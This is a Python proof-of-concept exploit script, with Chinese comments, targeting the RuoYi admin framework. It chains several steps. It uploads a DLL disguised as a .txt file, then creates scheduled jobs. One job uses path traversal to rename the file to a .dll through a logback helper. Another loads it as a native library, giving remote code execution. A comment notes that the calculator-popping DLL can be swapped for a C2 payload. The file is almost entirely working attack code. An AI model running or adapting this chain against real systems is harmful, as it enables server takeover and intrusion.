import json

import requests

# 更改为目标url
base_url = "http://127.0.0.1:4810"

# 记得替换cookie
headers = {
    'Cookie': 'JSESSIONID=ef41ab5c-d8b4-4802-a8a7-0928c67b91e3;'
}

# 配置代理，HTTP 和 HTTPS 都指向 Burp 的监听地址
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def fileUpload():
    url = f"{base_url}/common/upload"
    file = "com.ruoyi.quartz.task.txt"
    # 此dll为windows下弹出计算器，可自行更改，可配合C2
    files = {
        'file': (f'{file}', open('calc.dll', 'rb'))
    }
    resp = requests.post(url, files=files, headers=headers)
    print(resp.text)
    # 自动获取上传后的文件名
    fileName_txt = json.loads(resp.text)["fileName"].replace('/profile/', '')
    fileName_dll = fileName_txt.replace('.txt', '.dll')
    return fileName_txt, fileName_dll


def jobsRemove():
    # 删除已存在的任务
    burp0_url = f"{base_url}/monitor/job/remove"
    burp0_data = {"ids": "114,514"}
    resp = requests.post(burp0_url, headers=headers, data=burp0_data)
    print("任务删除情况：" + resp.text)


def jobExtensionCreate(fileName_txt, fileName_dll):
    burp0_url = f"{base_url}/monitor/job/add"
    # Windows默认路径情况；若更改过文件上传路径，则需要猜测路径前缀
    finalFileName_txt = f"../../../../../../../../../../../../../ruoyi/uploadPath/{fileName_txt}"
    finalFileName_dll = f"../../../../../../../../../../../../ruoyi/uploadPath/{fileName_dll}"
    burp0_data = {"jobId": "114", "createBy": "admin", "jobName": "ExtensionToDll", "jobGroup": "DEFAULT",
                  "invokeTarget": f"ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(\"{finalFileName_txt}\","
                                  f"\"{finalFileName_dll}\")", "cronExpression": "* * * * * ?", "misfirePolicy": "1",
                  "concurrent": "1", "remark": ''}
    resp = requests.post(burp0_url, headers=headers, data=burp0_data)
    print("修改扩展名任务创建情况："  + resp.text)
    return finalFileName_dll


def jobExtensionRun():
    burp0_url = f"{base_url}/monitor/job/run"
    # 跟上面的jobId保持一致
    burp0_data = {"jobId": "114"}
    resp = requests.post(burp0_url, headers=headers, data=burp0_data)
    print("修改扩展名任务执行情况：" + resp.text)


def jobJniCreate(finalFileName_dll):
    # 去掉扩展名
    finalFileName = finalFileName_dll[:len(finalFileName_dll)-4:]
    burp0_url = f"{base_url}/monitor/job/add"
    burp0_data = {"jobId": "514", "createBy": "admin", "jobName": "JNILoader", "jobGroup": "DEFAULT",
                  "invokeTarget": f"com.sun.glass.utils.NativeLibLoader.loadLibrary(\"{finalFileName}\")",
                  "cronExpression": "* * * * * ?", "misfirePolicy": "1", "concurrent": "1", "remark": ''}
    resp = requests.post(burp0_url, headers=headers, data=burp0_data)
    print("jni任务创建情况：" + resp.text)

def jobJniRun():
    burp0_url = f"{base_url}/monitor/job/run"
    burp0_data = {"jobId": "514"}
    resp = requests.post(burp0_url, headers=headers, data=burp0_data)
    print("jni任务运行情况：" + resp.text)

def test():
    s = "12345678"
    print(s[:len(s)-4:])

if __name__ == "__main__":
    # test()
    fileNames = fileUpload()
    jobsRemove()
    finalFileName_dll = jobExtensionCreate(fileNames[0], fileNames[1])
    jobExtensionRun()
    jobJniCreate(finalFileName_dll)
    jobJniRun()


